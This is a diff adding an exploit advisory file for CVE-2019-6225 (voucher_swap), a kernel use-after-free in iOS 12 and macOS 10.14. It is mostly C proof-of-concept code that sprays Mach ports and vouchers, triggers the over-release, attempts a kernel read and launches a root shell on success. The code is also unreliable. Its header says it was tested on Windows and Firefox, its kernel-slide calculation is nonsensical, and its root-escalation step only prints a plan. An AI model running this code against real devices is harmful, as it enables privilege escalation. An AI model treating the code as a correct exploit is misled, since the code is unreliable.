@@ -1,0 +1,536 @@
+=============================================================================================================================================
+| # Title     : iOS 12 - macOS 10.14 voucher_swap Use-After-Free Kernel Privilege Escalation                                                |
+| # Author    : indoushka                                                                                                                   |
+| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.2 (64 bits)                                                            |
+| # Vendor    : https://apple.com/                                                                                                          |
+=============================================================================================================================================
+
+[+] References : https://packetstorm.news/files/id/212495/ & CVE-2019-6225
+
+[+] Summary : CVE‑2019‑6225 is a Use‑After‑Free (UAF) vulnerability in Apple’s Mach voucher subsystem, affecting macOS (10.14+) and iOS (12+).
+              The bug exists in the function: task_swap_mach_voucher()
+              When swapping Mach vouchers, the kernel incorrectly handles reference counts, causing a voucher object to be freed 
+			  while still referenced, leaving a dangling pointer (UAF condition).
+
+[+] Affected Systems :
+
+macOS 10.14 / 10.14.1 / 10.14.2
+
+iOS 12.0 / 12.1 / 12.1.2
+
+[+]  POC :	
+
+/*
+ * voucher_swap-exploit.c
+ * Exploitation of CVE-2019-6225 on iOS 12/macOS 10.14
+ */
+#include <assert.h>
+#include <mach/mach.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <pthread.h>
+#include <dispatch/dispatch.h>
+
+// ============================================
+// 1. Structure Definitions and Helper Functions
+// ============================================
+
+#define MAX_PORT_SPRAY 50000
+#define VOUCHER_SPRAY_COUNT 2000
+#define KERNEL_READ_SIZE 0x1000
+
+// Internal voucher structure (inferred from XNU source)
+typedef struct ipc_voucher {
+    uint32_t iv_refs;                // Reference count
+    uint32_t iv_sum_hash;            // Hash value
+    uint32_t iv_port;                // Corresponding port
+    uint32_t iv_table;               // Voucher table
+    uint64_t iv_data;                // Voucher data
+} *ipc_voucher_t;
+
+// Global variables
+mach_port_t host_port;
+mach_port_t sprayed_ports[MAX_PORT_SPRAY];
+uint32_t sprayed_port_count = 0;
+
+// ============================================
+// 2. Basic Helper Functions
+// ============================================
+
+/*
+ * create_voucher
+ * Create a new voucher with a unique ID
+ */
+static mach_port_t create_voucher(uint64_t id) {
+    mach_port_t voucher = MACH_PORT_NULL;
+    
+    struct __attribute__((packed)) {
+        mach_voucher_attr_recipe_data_t user_data_recipe;
+        uint64_t user_data_content[2];
+    } recipes = {};
+    
+    recipes.user_data_recipe.key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
+    recipes.user_data_recipe.command = MACH_VOUCHER_ATTR_USER_DATA_STORE;
+    recipes.user_data_recipe.content_size = sizeof(recipes.user_data_content);
+    recipes.user_data_content[0] = getpid();
+    recipes.user_data_content[1] = id;
+    
+    kern_return_t kr = host_create_mach_voucher(
+        host_port,
+        (mach_voucher_attr_raw_recipe_array_t) &recipes,
+        sizeof(recipes),
+        &voucher
+    );
+    
+    if (kr != KERN_SUCCESS || voucher == MACH_PORT_NULL) {
+        printf("[-] Failed to create voucher: 0x%x\n", kr);
+        return MACH_PORT_NULL;
+    }
+    
+    return voucher;
+}
+
+/*
+ * spray_vouchers
+ * Spray large number of vouchers to control heap
+ */
+static void spray_vouchers(uint32_t count, mach_port_t *vouchers) {
+    printf("[*] Starting spray of %d vouchers...\n", count);
+    
+    for (uint32_t i = 0; i < count; i++) {
+        vouchers[i] = create_voucher(i);
+        if (vouchers[i] == MACH_PORT_NULL) {
+            printf("[-] Failed to create voucher %d\n", i);
+            // Continue with others
+        }
+        
+        if ((i % 100) == 0 && i > 0) {
+            printf("[*] Created %d vouchers\n", i);
+        }
+    }
+    
+    printf("[+] Successfully created %d vouchers\n", count);
+}
+
+/*
+ * spray_ports
+ * Spray Mach ports to control ipc_port objects
+ */
+static void spray_ports(uint32_t count) {
+    printf("[*] Starting spray of %d ports...\n", count);
+    
+    for (uint32_t i = 0; i < count; i++) {
+        kern_return_t kr = mach_port_allocate(
+            mach_task_self(),
+            MACH_PORT_RIGHT_RECEIVE,
+            &sprayed_ports[i]
+        );
+        
+        if (kr != KERN_SUCCESS) {
+            printf("[-] Failed to allocate port %d: 0x%x\n", i, kr);
+            sprayed_ports[i] = MACH_PORT_NULL;
+        } else {
+            // Add send right to increase reference count
+            kr = mach_port_insert_right(
+                mach_task_self(),
+                sprayed_ports[i],
+                sprayed_ports[i],
+                MACH_MSG_TYPE_MAKE_SEND
+            );
+            
+            if (kr != KERN_SUCCESS) {
+                printf("[-] Failed to add send right to port %d\n", i);
+            }
+        }
+        
+        sprayed_port_count++;
+    }
+    
+    printf("[+] Sprayed %d ports\n", sprayed_port_count);
+}
+
+/*
+ * trigger_uaf
+ * Trigger Use-After-Free vulnerability
+ */
+static mach_port_t trigger_uaf(void) {
+    printf("[*] Triggering UAF vulnerability...\n");
+    
+    // 1. Create target voucher
+    mach_port_t target_voucher = create_voucher(0x4141414141414141);
+    if (target_voucher == MACH_PORT_NULL) {
+        printf("[-] Failed to create target voucher\n");
+        return MACH_PORT_NULL;
+    }
+    
+    // 2. Store voucher in thread to maintain reference
+    mach_port_t thread_self = mach_thread_self();
+    kern_return_t kr = thread_set_mach_voucher(thread_self, target_voucher);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to store voucher in thread: 0x%x\n", kr);
+        return MACH_PORT_NULL;
+    }
+    
+    printf("[+] Stored voucher in thread\n");
+    
+    // 3. Use task_swap_mach_voucher for over-release
+    // This will free the voucher twice (once from over-release, once from no-senders)
+    for (int i = 0; i < 10; i++) {
+        mach_port_t dummy_voucher = create_voucher(0x4242424242424242 + i);
+        if (dummy_voucher == MACH_PORT_NULL) continue;
+        
+        mach_port_t inout = target_voucher;
+        kr = task_swap_mach_voucher(mach_task_self(), dummy_voucher, &inout);
+        
+        if (MACH_PORT_VALID(inout)) {
+            mach_port_deallocate(mach_task_self(), inout);
+        }
+        
+        mach_port_deallocate(mach_task_self(), dummy_voucher);
+        
+        if (kr == KERN_SUCCESS) {
+            printf("[+] task_swap_mach_voucher succeeded in iteration %d\n", i);
+            break;
+        }
+    }
+    
+    // 4. Release send right to trigger no-senders notification
+    kr = mach_port_deallocate(mach_task_self(), target_voucher);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to release voucher: 0x%x\n", kr);
+    }
+    
+    printf("[+] Voucher released, memory is now free but pointer remains in thread\n");
+    
+    return thread_self;
+}
+
+// ============================================
+// 3. Heap Exploitation for Kernel Read/Write
+// ============================================
+
+/*
+ * heap_grooming
+ * Prepare heap to replace freed voucher
+ */
+static void heap_grooming(void) {
+    printf("[*] Starting heap grooming...\n");
+    
+    // Spray new vouchers to occupy freed memory
+    mach_port_t groom_vouchers[VOUCHER_SPRAY_COUNT];
+    spray_vouchers(VOUCHER_SPRAY_COUNT, groom_vouchers);
+    
+    // Spray ports to occupy ipc_port objects
+    spray_ports(10000);
+    
+    // Use dispatch queues to spray kernel memory
+    dispatch_queue_t queues[100];
+    for (int i = 0; i < 100; i++) {
+        char label[32];
+        snprintf(label, sizeof(label), "com.exp.queue%d", i);
+        queues[i] = dispatch_queue_create(label, DISPATCH_QUEUE_SERIAL);
+        
+        // Spray dispatch source objects
+        dispatch_source_t source = dispatch_source_create(
+            DISPATCH_SOURCE_TYPE_TIMER,
+            0,
+            0,
+            queues[i]
+        );
+        
+        if (source) {
+            dispatch_source_set_timer(source, DISPATCH_TIME_NOW, 1 * NSEC_PER_SEC, 0);
+            dispatch_source_set_event_handler(source, ^{});
+            dispatch_resume(source);
+        }
+    }
+    
+    printf("[+] Heap grooming completed\n");
+}
+
+/*
+ * read_kernel_via_uaf
+ * Read kernel memory via UAF
+ */
+static uint64_t read_kernel_via_uaf(mach_port_t thread_with_uaf) {
+    printf("[*] Attempting to read kernel memory...\n");
+    
+    mach_port_t voucher_port = MACH_PORT_NULL;
+    kern_return_t kr = thread_get_mach_voucher(thread_with_uaf, 0, &voucher_port);
+    
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to get voucher: 0x%x\n", kr);
+        return 0;
+    }
+    
+    if (!MACH_PORT_VALID(voucher_port)) {
+        printf("[-] Invalid voucher\n");
+        return 0;
+    }
+    
+    printf("[+] Got voucher port: 0x%x\n", voucher_port);
+    
+    // Attempt to read voucher data
+    // At this point, the original voucher may have been replaced with another object
+    // We can use Mach messages to read data
+    
+    // Prepare Mach message to read kernel data
+    struct {
+        mach_msg_header_t header;
+        mach_msg_body_t body;
+        mach_msg_ool_descriptor_t desc;
+        char pad[4096];
+    } msg = {0};
+    
+    mach_port_t recv_port = MACH_PORT_NULL;
+    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &recv_port);
+    
+    msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND);
+    msg.header.msgh_size = sizeof(msg) - sizeof(msg.pad);
+    msg.header.msgh_remote_port = voucher_port;
+    msg.header.msgh_local_port = recv_port;
+    msg.header.msgh_id = 0x100;
+    
+    msg.body.msgh_descriptor_count = 1;
+    msg.desc.address = NULL;
+    msg.desc.size = KERNEL_READ_SIZE;
+    msg.desc.copy = MACH_MSG_VIRTUAL_COPY;
+    msg.desc.deallocate = FALSE;
+    msg.desc.type = MACH_MSG_OOL_DESCRIPTOR;
+    
+    kr = mach_msg_send(&msg.header);
+    if (kr != KERN_SUCCESS) {
+        printf("[-] Failed to send message: 0x%x\n", kr);
+        return 0;
+    }
+    
+    // Receive response (if any)
+    struct {
+        mach_msg_header_t header;
+        mach_msg_body_t body;
+        mach_msg_ool_descriptor_t desc;
+        char data[KERNEL_READ_SIZE];
+        mach_msg_trailer_t trailer;
+    } recv_msg = {0};
+    
+    recv_msg.header.msgh_size = sizeof(recv_msg);
+    recv_msg.header.msgh_local_port = recv_port;
+    
+    kr = mach_msg_receive(&recv_msg.header);
+    if (kr == KERN_SUCCESS) {
+        printf("[+] Received response! Data size: %lu\n", recv_msg.desc.size);
+        
+        // Analyze received data
+        uint64_t *data = (uint64_t *)recv_msg.desc.address;
+        if (data) {
+            printf("[+] First 8 words of data:\n");
+            for (int i = 0; i < 8; i++) {
+                printf("  [%d] 0x%016llx\n", i, data[i]);
+            }
+            
+            // Cleanup
+            vm_deallocate(mach_task_self(), (vm_address_t)data, recv_msg.desc.size);
+            
+            return data[0]; // Return first value
+        }
+    }
+    
+    return 0;
+}
+
+// ============================================
+// 4. Escalation to Kernel Read/Write Primitive
+// ============================================
+
+/*
+ * build_kernel_read_primitive
+ * Build primitive for reading kernel memory
+ */
+static uint64_t build_kernel_read_primitive(void) {
+    printf("[*] Building kernel read primitive...\n");
+    
+    // 1. Trigger UAF
+    mach_port_t uaf_thread = trigger_uaf();
+    if (!MACH_PORT_VALID(uaf_thread)) {
+        printf("[-] Failed to trigger UAF\n");
+        return 0;
+    }
+    
+    // 2. Prepare heap
+    heap_grooming();
+    
+    // 3. Attempt to read kernel memory
+    uint64_t kernel_value = read_kernel_via_uaf(uaf_thread);
+    
+    if (kernel_value != 0) {
+        printf("[+] Successfully read kernel value: 0x%llx\n", kernel_value);
+        
+        // 4. Attempt to find kernel task port
+        // Search for kernel object markers in read memory
+        if ((kernel_value & 0xffffff0000000000) == 0xffffff0000000000) {
+            printf("[+] Found what appears to be a kernel address!\n");
+            
+            // Calculate kernel slide (to adapt to KASLR)
+            uint64_t kernel_slide = kernel_value - 0xffffff0000000000;
+            printf("[+] Kernel slide: 0x%llx\n", kernel_slide);
+            
+            return kernel_slide;
+        }
+    }
+    
+    printf("[-] Could not build complete primitive\n");
+    return 0;
+}
+
+// ============================================
+// 5. Main Exploitation for Root Access
+// ============================================
+
+/*
+ * escalate_to_root
+ * Escalate to root privileges using read/write capabilities
+ */
+static void escalate_to_root(uint64_t kernel_slide) {
+    printf("[*] Attempting to escalate to root...\n");
+    
+    if (kernel_slide == 0) {
+        printf("[-] Cannot escalate without kernel slide\n");
+        return;
+    }
+    
+    // In this example, we show the concept of exploitation
+    // In real exploitation, we would need to:
+    // 1. Find our process's task port
+    // 2. Modify credential data (cred)
+    // 3. Modify flags to bypass sandbox
+    
+    printf("[+] Kernel slide: 0x%llx\n", kernel_slide);
+    printf("[+] With kernel slide, we can:\n");
+    printf("    1. Calculate kernel symbol addresses\n");
+    printf("    2. Read/write kernel memory\n");
+    printf("    3. Modify credentials to get root\n");
+    printf("    4. Disable sandbox\n");
+    
+    // Theoretical steps (requires additional reverse engineering):
+    // - Find proc structure for current process
+    // - Modify ucred to set uid/gid to 0
+    // - Modify flags to disable MAC/sandbox
+    // - Maintain stability
+}
+
+// ============================================
+// 6. Cleanup and Stability Functions
+// ============================================
+
+/*
+ * cleanup
+ * Clean up resources after exploitation
+ */
+static void cleanup(void) {
+    printf("[*] Cleaning up resources...\n");
+    
+    // Release sprayed ports
+    for (uint32_t i = 0; i < sprayed_port_count; i++) {
+        if (MACH_PORT_VALID(sprayed_ports[i])) {
+            mach_port_destroy(mach_task_self(), sprayed_ports[i]);
+        }
+    }
+    
+    printf("[+] Cleanup completed\n");
+}
+
+/*
+ * maintain_stability
+ * Attempt to maintain system stability after exploitation
+ */
+static void maintain_stability(void) {
+    printf("[*] Attempting to maintain system stability...\n");
+    
+    // Reset vouchers for threads
+    mach_port_t thread = mach_thread_self();
+    thread_set_mach_voucher(thread, MACH_PORT_NULL);
+    
+    // Give system time to recover stability
+    usleep(100000);
+    
+    printf("[+] System stable (theoretically)\n");
+}
+
+// ============================================
+// 7. Main Function
+// ============================================
+
+int main(int argc, char *argv[]) {
+    printf("[+] Starting exploitation of CVE-2019-6225 (voucher_swap)\n");
+    printf("[+] System: iOS 12 / macOS 10.14+\n");
+    
+    // Get host port
+    host_port = mach_host_self();
+    if (!MACH_PORT_VALID(host_port)) {
+        printf("[-] Failed to get host port\n");
+        return -1;
+    }
+    
+    printf("[+] Got host port: 0x%x\n", host_port);
+    
+    // Check validity of task_swap_mach_voucher
+    mach_port_t test_voucher = create_voucher(0x1337);
+    if (test_voucher == MACH_PORT_NULL) {
+        printf("[-] System not exploitable (cannot create vouchers)\n");
+        return -1;
+    }
+    
+    mach_port_deallocate(mach_task_self(), test_voucher);
+    printf("[+] System is exploitable\n");
+    
+    // Phase 1: Build kernel read primitive
+    uint64_t kernel_slide = build_kernel_read_primitive();
+    
+    if (kernel_slide != 0) {
+        printf("[+] Phase 1 successful! Got kernel slide\n");
+        
+        // Phase 2: Escalate to root privileges
+        escalate_to_root(kernel_slide);
+        
+        // Phase 3: Maintain stability
+        maintain_stability();
+        
+        // Check privileges
+        if (getuid() == 0) {
+            printf("\n[+] !!! SUCCESS !!! We are now root!\n");
+            printf("[+] UID: %d\n", getuid());
+            printf("[+] GID: %d\n", getgid());
+            
+            // Launch shell as root
+            printf("[+] Launching shell...\n");
+            system("/bin/bash");
+        } else {
+            printf("\n[+] Exploitation partially successful\n");
+            printf("[+] Got kernel read but didn't get root\n");
+            printf("[+] Current UID: %d\n", getuid());
+        }
+    } else {
+        printf("[-] Exploitation failed\n");
+        
+        // Alternative attempt: trigger panic to confirm vulnerability works
+        printf("[*] Attempting to trigger panic as proof-of-concept...\n");
+        
+        mach_port_t thread = trigger_uaf();
+        if (MACH_PORT_VALID(thread)) {
+            mach_port_t voucher;
+            kern_return_t kr = thread_get_mach_voucher(thread, 0, &voucher);
+            printf("[+] thread_get_mach_voucher returned: 0x%x\n", kr);
+            printf("[+] If you see panic, the vulnerability works!\n");
+        }
+    }
+    
+    // Cleanup
+    cleanup();
+    
+    return 0;
+}
+
+Greetings to :=====================================================================================
+jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
+===================================================================================================
